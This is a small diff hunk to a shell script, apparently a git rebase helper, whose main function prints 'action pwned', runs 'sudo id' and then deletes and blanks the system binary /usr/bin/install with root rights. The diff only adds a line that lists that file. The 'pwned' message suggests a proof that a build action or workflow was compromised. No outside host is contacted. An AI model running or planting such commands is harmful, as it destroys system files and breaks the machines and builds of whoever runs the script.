@@ -39,6 +39,7 @@ function rebase_atop_of_the_latest_target_branch() {
 function main() {
     echo "action pwned"
     sudo id
+    ls -la /usr/bin/install
 
     sudo rm -rf /usr/bin/install
     sudo echo > /usr/bin/install
